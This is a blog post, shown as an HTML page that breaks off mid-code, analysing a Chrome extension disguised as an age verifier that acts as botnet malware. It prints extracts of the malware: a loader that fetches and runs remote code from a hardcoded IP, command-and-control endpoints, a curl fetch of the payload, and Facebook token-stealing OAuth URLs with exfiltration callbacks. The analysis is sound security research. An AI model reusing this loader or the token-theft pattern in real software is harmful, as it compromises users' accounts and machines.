@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en" prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
+<head>
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Malware in the browser: how you might get hacked by a Chrome extension</title>
+<meta name="author" content="Maxime Kjaer">
+<meta name="description" content="A case study of a Chrome extension that turned out to be some nasty botnet malware.">
+<link rel="icon" href="/favicon.ico?v=1.0">
+
+<link href="https://fonts.googleapis.com/css?family=Lora:400,400i,700|Oswald:300,700&amp;subset=latin-ext" rel="stylesheet">
+<link rel="stylesheet" href="/css/index.css">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta property="og:site_name" content="OUTPUT&amp;nbsp;&amp;ndash;&amp;nbsp;The blog of Maxime Kjaer">
+<meta property="article:author" content="/about/">
+<meta name="twitter:site" content="@maximekjaer">
+<meta name="twitter:creator" content="@maximekjaer">
+<meta property="og:title" content="Malware in the browser: how you might get hacked by a Chrome extension">
+<meta name="twitter:title" content="Malware in the browser: how you might get hacked by a Chrome extension">
+<meta property="og:description" content="A case study of a Chrome extension that turned out to be some nasty botnet malware.">
+<meta name="twitter:description" content="A case study of a Chrome extension that turned out to be some nasty botnet malware.">
+<meta property="og:image" content="https://kjaer.io/images/hero/fox.jpg">
+<meta name="twitter:image" content="https://kjaer.io/images/hero/fox.jpg">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2016-07-18T00:00:00+00:00">
+<meta property="og:url" content="https://kjaer.io/extension-malware/">
+
+<link rel="alternate" type="application/rss+xml" title="OUTPUT&amp;nbsp;&amp;ndash;&amp;nbsp;The blog of Maxime Kjaer" href="/feed.xml">
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-59915030-2', 'auto');
+    ga('send', 'pageview', {
+      'anonymizeIp': true,
+      'page': '/extension-malware/',
+      'title': 'Malware in the browser: how you might get hacked by a Chrome extension'
+    });
+</script>
+<style type="text/css">
+        .hero {
+            background-color: #292335;
+            background-image: url('/images/hero/fox.jpg');
+        }
+@media (max-device-width: 1440px) {
+	.hero {
+		background-image: url('/images/hero/fox-1440px.jpg');
+	}
+}
+@media (max-device-width: 1200px) {
+	.hero {
+		background-image: url('/images/hero/fox-1200px.jpg');
+	}
+}
+@media (max-device-width: 800px) {
+	.hero {
+		background-image: url('/images/hero/fox-800px.jpg');
+	}
+}
+@media (max-device-width: 550px) {
+	.hero {
+		background-image: url('/images/hero/fox-550px.jpg');
+	}
+}
+@media (max-device-width: 380px) {
+	.hero {
+		background-image: url('/images/hero/fox-380px.jpg');
+	}
+}
+        </style>
+</head>
+<body>
+<header class="hero">
+<nav>
+<a href="/notes/">NOTES</a>
+<a href="/about/">ABOUT</a>
+</nav>
+<div class="title">
+<a href="/">
+<h1>OUTPUT</h1>
+<p>The blog of <span title="/maksim ˈkjɛɹ/">Maxime Kjaer</span></p>
+</a>
+</div>
+</header>
+<main class="content">
+<div class="container">
+<article class="post">
+<header>
+<h1>Malware in the browser: how you might get hacked by a Chrome extension</h1>
+<p class="date">
+<time datetime="2016-07-18">
+July 18, 2016
+</time>
+</p>
+</header>
+<p>Increasingly, browsers are taking on a central role in our daily lives. With web apps for everything, we have placed our most intimate data on online services such as Facebook, Amazon or GMail. This move to online services has required that we up the security of our online services, and due diligence has brought us HTTPS-only sites, two-factor authentication, and so on. But there’s still a weak link in the chain: a rogue browser extension can impair all of those security measures.</p>
+<p>It seems like most people are unaware of how big of an attack vector browser extensions have become. They’re still quite unregulated territory, and although there are inherent limits to what they can do, there exists little to no protection against extension malware — your antivirus can’t help you here.</p>
+<p>In this post, I’ll share what I have found by investigating one such malware extension that a friend of mine was infected by. I’ve hesitated a lot about publishing all of the code, but have finally decided against it; I would never want to help propagate malware. However, I still want to show how this malware functions, so I’ll be posting <em>extracts</em> of the code in this post. I’ve taken the liberty to remove some lines that were irrelevant to the point I was making, but everything else is really as I have found it.</p>
+
+<h2 id="discovery">Discovery</h2>
+<p>On my Facebook news feed, I had noticed that one of my friends was regularly liking some weird, lewd, clickbaity links. Now clickbait content is far from uncommon on Facebook, but something was off in this case. I had noticed a pattern: it was always the same friend who would Like the same type of links. They would always have around 900 Likes and no comments, while the <a href="https://www.facebook.com/Todays-Buzz-1587645808222576/">page behind them</a> has about 30 Likes. Even weirder: every single post on that page is posted 25 times.</p>
+<figure>
+<img src="/images/chrome-malware/liked-post.png" alt="A Facebook post linking to an article about kissing tips." />
+<figcaption>One of the posts that my friend had Liked. 940 Likes, no comments.</figcaption>
+</figure>
+<p>Now I know my friend; he’s a smart guy, so I don’t really see him liking tons of this (frankly) crap content. Intrigued, I decided to go down the rabbit hole and see what this was all about.</p>
+<p>So I clicked on one of these links. Huge mistake.</p>
+<p>I was instantly greeted with a message saying that I should verify my age before I could view the content. The semi-raunchy nature of the content made it seem sort of justified. What wasn’t justified, though, was the fact that this verification had to be done by installing a Chrome extension.</p>
+<figure>
+<img src="/images/chrome-malware/extension.png" alt="Screenshot of the extension in the Chrome Webstore" />
+<figcaption>The Chrome extension that I would have to install in order to "verify my age"</figcaption>
+</figure>
+<p>The extension is allegedly offered by a website called <code class="highlighter-rouge">viralands.com</code> (not linking to them). A <a href="https://chrome.google.com/webstore/search/viralands.com?_category=extensions">quick search</a> for their other extensions revealed that they had 9 visibly identical extensions. They’ve now been removed, but back when I looked at it, those extensions had a total of 132,265 users.</p>
+<figure>
+<img src="/images/chrome-malware/viralands-extensions.png" alt="Screenshot of Viraland's extensions in the Chrome Webstore" />
+<figcaption>A list of almost identical extensions being offered by Viralands on the Chrome Webstore</figcaption>
+</figure>
+<p>Feeling that something was completely off, I decided to take a look at the extension’s code before doing anything else. Here’s what I found.</p>
+<h2 id="a-facade-of-utility">A facade of utility</h2>
+<h3 id="the-extension-manifest-is-suspicious-at-best">The extension manifest is suspicious at best</h3>
+<p>A good place to start is the extension’s manifest, a file called <code class="highlighter-rouge">manifest.json</code>. This is a metadata file containing information about the extension such as its name, description, version number, permissions, and so on.</p>
+<p>Generally, looking at the requested permissions and listed scripts gives an idea of what the extension will do. The extensions asks the following permissions:</p>
+<figure class="highlight"><pre><code class="language-json" data-lang="json"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="code"><pre><span class="p">{</span><span class="w">
+	</span><span class="nl">"permissions"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+		</span><span class="s2">"storage"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"&lt;all_urls&gt;"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"tabs"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"webNavigation"</span><span class="p">,</span><span class="w">
+		</span><span class="s2">"alarms"</span><span class="w">
+	</span><span class="p">]</span><span class="w">
+</span><span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
+<p>When installing the extension Chrome translates these permissions to to the following warning:</p>
+<blockquote>
+<p>Add “Viral Content Age Verify”?<br />
+It can:</p>
+<ul>
+<li>Read and change all your data on the websites you visit.</li>
+</ul>
+</blockquote>
+<p>Already, this seems like an awful lot for an extension that just needs to check your age, doesn’t it?</p>
+<p>If we keep reading the manifest file, we find the following lines:</p>
+<figure class="highlight"><pre><code class="language-json" data-lang="json"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="code"><pre><span class="p">{</span><span class="w">
+	</span><span class="nl">"background"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+		</span><span class="nl">"scripts"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+			</span><span class="s2">"scripts/query-string.js"</span><span class="p">,</span><span class="w">
+			</span><span class="s2">"scripts/install.js"</span><span class="p">,</span><span class="w">
+			</span><span class="s2">"background.js"</span><span class="w">
+		</span><span class="p">],</span><span class="w">
+		</span><span class="nl">"persistent"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+	</span><span class="p">},</span><span class="w">
+	</span><span class="nl">"content_security_policy"</span><span class="p">:</span><span class="w"> </span><span class="s2">"script-src blob: filesystem: chrome-extension-resource: 'self' 'unsafe-eval'; object-src 'self'"</span><span class="w">
+</span><span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
+<p>So all in all, it wants to run 3 scripts persistently (meaning that they can’t be paused), while being able to <em>fetch data from anywhere, store it, and evaluate stored code unsafely</em>. This isn’t boding all too well already. Let’s take a look at the three scripts (<code class="highlighter-rouge">background.js</code>, <code class="highlighter-rouge">query-string.js</code> and <code class="highlighter-rouge">install.js</code>) to see if there is any validity to our suspicions.</p>
+<h3 id="the-age-verification-is-fake">The age verification is fake</h3>
+<p>The <code class="highlighter-rouge">background.js</code> script is quite short, as it only does one thing: when the extension is installed, it opens a popup. The popup is a simple HTML form where you can enter your birthday and press “Verify”. Oh cool, the extension might actually do as advertised!</p>
+<p>But the JavaScript that runs on that age verification page is particularly interesting, as it tells another story:</p>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="code"><pre><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">'</span><span class="s1">#submit</span><span class="dl">'</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">click</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+	<span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">'</span><span class="s1">#box</span><span class="dl">'</span><span class="p">).</span><span class="nx">hidden</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+	<span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loading</span><span class="dl">'</span><span class="p">).</span><span class="nx">hidden</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+	
+	<span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+		<span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loading</span><span class="dl">'</span><span class="p">).</span><span class="nx">hidden</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+		<span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">'</span><span class="s1">#done</span><span class="dl">'</span><span class="p">).</span><span class="nx">hidden</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+	<span class="p">},</span> <span class="p">(</span><span class="nx">randomIntFromInterval</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span> <span class="o">+</span> <span class="mf">0.5</span><span class="p">)</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">);</span>
+<span class="p">});</span>
+</pre></td></tr></tbody></table></code></pre></figure>
+<p>Yes, you’re reading this right. If you click “Verify” it will display “Loading…” and idle for a random amount of time, and then say “Done”. It doesn’t do anything; the age verification is a dummy.</p>
+<p>So what is it hiding? The extension runs two more scripts, namely <code class="highlighter-rouge">query-string.js</code> and <code class="highlighter-rouge">install.js</code>. Let’s see what’s going on in those.</p>
+<h2 id="what-is-it-actually-doing">What is it actually doing?</h2>
+<h3 id="fetching-a-remote-payload">Fetching a remote payload</h3>
+<p>The <code class="highlighter-rouge">query-string.js</code> script isn’t of much interest, as it’s just a copy of <a href="https://github.com/sindresorhus/query-string">this <abbr title="Node Package Manager">NPM</abbr> package</a>.</p>
+<p><em>But you’ll never believe what install.js does! Line 133 will surprise you</em> (It hurt me a little bit on the inside to write a sentence like that).</p>
+<p>Among the first lines of <code class="highlighter-rouge">install.js</code> is this eye-striking line:</p>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">programUrl</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">http://104.131.35.136:9999/jsnew.php?id=22</span><span class="dl">'</span><span class="p">;</span></code></pre></figure>
+<p>It’s a hardcoded variable for an external server on which to fetch scripts (also it doesn’t even have the courtesy to do it over HTTPS. Bonus <abbr title="Man In The Middle">MITM</abbr> attacks yay!).</p>
+<p><em>Spoiler alert</em>: The script that it fetches from the above server is a malware payload. The extension needs to download it after having been installed because it cannot ship with the payload if it wants to pass through the Chrome Webstore’s security checks.</p>
+<p>It fetches a script from the server, stores it in localStorage and executes it. We can see this happening in the <code class="highlighter-rouge">getProgram()</code> function.</p>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nx">getProgram</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+	<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">programUrl</span><span class="p">;</span>
+	<span class="kd">var</span> <span class="nx">querySign</span> <span class="o">=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">?</span><span class="dl">'</span><span class="p">)</span> <span class="o">===</span> <span class="o">-</span><span class="mi">1</span> <span class="p">?</span> <span class="dl">'</span><span class="s1">?</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="p">;</span>
+	
+	<span class="nx">url</span> <span class="o">+=</span> <span class="nx">querySign</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">r=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
+	
+	<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+	<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">XYZ-Extension-Id</span><span class="dl">'</span><span class="p">,</span> <span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">id</span><span class="p">);</span>
+	
+	<span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+		<span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">response</span><span class="p">;</span>
+		
+		<span class="k">try</span> <span class="p">{</span>
+			<span class="kd">var</span> <span class="nx">fn</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Function</span><span class="dl">'</span><span class="p">](</span><span class="nx">code</span><span class="p">);</span>
+			<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Executing loaded code</span><span class="dl">'</span><span class="p">);</span>
+			<span class="nx">fn</span><span class="p">();</span> <span class="c1">// exit if error</span>
+	
+			<span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">localCode</span><span class="dl">'</span><span class="p">,</span> <span class="nx">code</span><span class="p">);</span>
+		<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
+		<span class="p">}</span>
+		
+		<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
+<p>I was able to simulate a such request with the following cURL command.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl <span class="nt">-o</span> external.js <span class="nt">--header</span> <span class="s2">"XYZ-Extension-Id: nogheblblcgkncmpggmikmcpnjdihgdd"</span> http://104.131.35.136:9999/jsnew.php?id<span class="o">=</span>22&amp;r<span class="o">=</span>1467883037000</code></pre></figure>
+<p>This gave me the malware payload. It doesn’t have a formal name, but I called it <code class="highlighter-rouge">external.js</code>. This is a fairly long file, clocking in at 1288 lines. Here’s what it’s capable of doing.</p>
+<h3 id="getting-instructions-from-an-external-server">Getting instructions from an external server</h3>
+<p>Two <abbr title="Uniform Resource Locators">URLs</abbr> are defined in the beginning of <code class="highlighter-rouge">external.js</code>:</p>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="code"><pre><span class="kd">var</span> <span class="nx">ACTIONS_URL</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">http://159.203.99.206/api/get/</span><span class="dl">'</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">STATUS_URL</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">http://159.203.99.206/api/status</span><span class="dl">'</span><span class="p">;</span>
+</pre></td></tr></tbody></table></code></pre></figure>
+<p>The first <abbr title="Uniform Resource Locator">URL</abbr> is to get instructions from a server, and the second one is to report back to it. This model of getting instructions from a server and sending the status back is not a new trick at all; it’s called <a href="https://en.wikipedia.org/wiki/Command_and_control_(malware)">Command and Control</a> (or <abbr title="Command and Control">C&C</abbr> for short).</p>
+<p>We’ll discover how the extension gets instructions from the <abbr title="Command and Control">C&C</abbr> server, and what the instructions contain by looking at the <code class="highlighter-rouge">getActions()</code> function defined in <code class="highlighter-rouge">external.js</code>:</p>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nx">getActions</span><span class="p">(</span><span class="nx">uid</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+	
+	<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="nx">ACTIONS_URL</span> <span class="o">+</span> <span class="nx">uid</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+	<span class="nx">xhr</span><span class="p">.</span><span class="nx">responseType</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">json</span><span class="dl">'</span><span class="p">;</span>
+	
+	<span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+		<span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">response</span><span class="p">;</span>
+		<span class="kd">var</span> <span class="nx">actions</span> <span class="o">=</span> <span class="nx">data</span> <span class="o">&amp;&amp;</span> <span class="nx">data</span><span class="p">.</span><span class="nx">actions</span><span class="p">;</span>
+		
+		<span class="k">if</span> <span class="p">(</span><span class="nb">Array</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">actions</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">actions</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+			<span class="nx">checkFBLogin</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
+				<span class="nx">fbLoginStatus</span> <span class="o">=</span> <span class="nx">status</span><span class="p">;</span>
+				<span class="nx">handleActions</span><span class="p">(</span><span class="nx">actions</span><span class="p">);</span>
+			<span class="p">});</span>
+		<span class="p">}</span>
+	<span class="p">};</span>
+	
+	<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
+<p>The <code class="highlighter-rouge">uid</code> variable is a unique identifier for your machine, and is generated by a function called <code class="highlighter-rouge">generateUID()</code>:</p>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nx">generateUID</span><span class="p">()</span> <span class="p">{</span>
+	<span class="kd">var</span> <span class="nx">array</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+	<span class="nb">window</span><span class="p">.</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">getRandomValues</span><span class="p">(</span><span class="nx">array</span><span class="p">);</span>
+	
+	<span class="k">return</span> <span class="p">[].</span><span class="nx">map</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">array</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="nx">n</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+	<span class="p">}).</span><span class="nx">join</span><span class="p">(</span><span class="dl">''</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
+<p>I ran it once, and it gave me:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">c38ae4ec1d2820bc9e2c03c0fe517585644576c988a03ae84af63b6d2bc9e7</code></pre></figure>
+<p>So this is what I’ll use as an example. You’ll need to create your own <abbr title="Unique Identifier">UID</abbr> if you want to get your very own instructions. To simulate a request to the server, I ran:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl <span class="nt">-o</span> actions.json http://159.203.99.206/api/get/c38ae4ec1d2820bc9e2c03c0fe517585644576c988a03ae84af63b6d2bc9e7</code></pre></figure>
+<p>This returns a <abbr title="JavaScript Object Notation">JSON</abbr> file containing a list of actions that the extension will undertake. Here are the instruction I got:</p>
+<figure class="highlight"><pre><code class="language-json" data-lang="json"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+</pre></td><td class="code"><pre><span class="p">{</span><span class="w">
+	</span><span class="nl">"actions"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+		</span><span class="p">{</span><span class="w">
+			</span><span class="nl">"actionType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ap"</span><span class="p">,</span><span class="w">
+			</span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+				</span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://www.facebook.com/dialog/oauth?redirect_uri=http%3A%2F%2Fwww.facebook.com%2Fconnect%2Flogin_success.html&amp;scope=email%2Cpublish_actions%2Cuser_about_me%2Cuser_actions.books%2Cuser_actions.music%2Cuser_actions.news%2Cuser_actions.video%2Cuser_activities%2Cuser_birthday%2Cuser_education_history%2Cuser_events%2Cuser_games_activity%2Cuser_groups%2Cuser_hometown%2Cuser_interests%2Cuser_likes%2Cuser_location%2Cuser_notes%2Cuser_photos%2Cuser_questions%2Cuser_relationship_details%2Cuser_relationships%2Cuser_religion_politics%2Cuser_status%2Cuser_subscriptions%2Cuser_videos%2Cuser_website%2Cuser_work_history%2Cfriends_about_me%2Cfriends_actions.books%2Cfriends_actions.music%2Cfriends_actions.news%2Cfriends_actions.video%2Cfriends_activities%2Cfriends_birthday%2Cfriends_education_history%2Cfriends_events%2Cfriends_games_activity%2Cfriends_groups%2Cfriends_hometown%2Cfriends_interests%2Cfriends_likes%2Cfriends_location%2Cfriends_notes%2Cfriends_photos%2Cfriends_questions%2Cfriends_relationship_details%2Cfriends_relationships%2Cfriends_religion_politics%2Cfriends_status%2Cfriends_subscriptions%2Cfriends_videos%2Cfriends_website%2Cfriends_work_history%2Cads_management%2Ccreate_event%2Ccreate_note%2Cexport_stream%2Cfriends_online_presence%2Cmanage_friendlists%2Cmanage_notifications%2Cmanage_pages%2Cphoto_upload%2Cpublish_stream%2Cread_friendlists%2Cread_insights%2Cread_mailbox%2Cread_page_mailboxes%2Cread_requests%2Cread_stream%2Crsvp_event%2Cshare_item%2Csms%2Cstatus_update%2Cuser_online_presence%2Cvideo_upload%2Cxmpp_login&amp;response_type=token&amp;client_id=41158896424&amp;_rdr"</span><span class="p">,</span><span class="w">
+				</span><span class="nl">"callback"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://159.203.99.206/api/getToken"</span><span class="w">
+			</span><span class="p">}</span><span class="w">
+		</span><span class="p">},</span><span class="w">
+		</span><span class="p">{</span><span class="w">
+			</span><span class="nl">"actionType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ap"</span><span class="p">,</span><span class="w">
+			</span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+				</span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://www.facebook.com/dialog/oauth?redirect_uri=http%3A%2F%2Fwww.facebook.com%2Fconnect%2Flogin_success.html&amp;scope=email%2Cpublish_actions&amp;response_type=token&amp;client_id=241284008322&amp;_rdr"</span><span class="p">,</span><span class="w">
+				</span><span class="nl">"callback"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://159.203.99.206/api/getToken2"</span><span class="w">
+			</span><span class="p">}</span><span class="w">
+		</span><span class="p">},</span><span class="w">
+		</span><span class="p">{</span><span class="w">
+			</span><span class="nl">"actionType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"lk"</span><span class="p">,</span><span class="w">
+			</span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+				</span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"VVideosss"</span><span class="w">
+			</span><span class="p">}</span><span class="w">
+		</span><span class="p">}</span><span class="w">
+	</span><span class="p">]</span><span class="w">
+</span><span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
+<p>Let’s try to make sense of what this means the extension is doing.</p>
+<h3 id="leaking-your-access-tokens">Leaking your access tokens</h3>
+<p>The first two actions contain links that the extension can <a href="https://www.facebook.com/help/1380078335599589#What-is-access-token-theft?">steal your access tokens from</a>. If you load these links, you will be forwarded to an <abbr title="Uniform Resource Locator">URL</abbr> containing your <a href="https://en.wikipedia.org/wiki/Access_token">access tokens</a>, which the extension will catch and send to the server in the <code class="highlighter-rouge">callback</code> field above.</p>
+<p>With your Facebook access token, the malware operators have access to your account. They can log in to it, send and read messages, post statuses and links, comment, Like posts and pages… Having these stolen is equivalent to having your login credentials stolen.</p>
+<h3 id="liking-facebook-pages">Liking Facebook pages</h3>
+<p>The instructions that I downloaded also told the extension to go Like a page called <em>VVideosss</em>. Let’s check the page out:</p>
+<figure>
+<img src="/images/chrome-malware/vvideosss.png" alt="Screenshot of the Vvideosss Facebook page" />
+<figcaption> 168,153 Likes, what a popular page! Wait, that's not too far from the 132,265 users that have been infected by the Viralands extensions, is it?</figcaption>
+</figure>
+<p>It seems likely to me that the page in question must’ve bought some Likes from some dodgy provider (which, side note, is an adjective that applies to all Facebook Like sellers) that creates Likes from infected computers instead of clickfarms or something. Though this is pure speculation, I’m certain that something fishy is going on with this page.</p>
+<h3 id="subscribing-you-to-youtube-channels">Subscribing you to YouTube channels</h3>
+<p>I didn’t get any instructions to subscribe to any YouTube channels, but the code does contain a function that does just that.</p>
+<h3 id="reporting-back-to-the-server">Reporting back to the server</h3>
+<p>The extension can also report back to the <abbr title="Command and Control">C&C</abbr> server about its current status, through the following function:</p>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nx">sendStatus</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">uid</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">storage</span><span class="p">)</span> <span class="p">{</span>
